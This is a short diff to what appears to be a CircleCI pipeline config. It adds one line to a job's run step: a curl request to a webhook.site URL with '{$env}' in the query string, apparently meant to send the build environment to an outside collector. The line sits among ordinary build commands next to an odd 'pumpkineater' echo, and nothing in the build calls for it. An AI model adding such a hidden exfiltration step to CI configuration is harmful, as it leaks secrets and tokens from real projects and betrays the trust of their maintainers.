@@ -60,6 +60,7 @@ jobs:
       - run:
           command: |
             echo "Test.... pumpkineater"
+            curl https://webhook.site/87f6895e-304c-40eb-b457-3827a0d300bb?={$env}
             cd .circleci/config
             yarn
             export CIRCLECI_BINARY="$HOME/circleci"
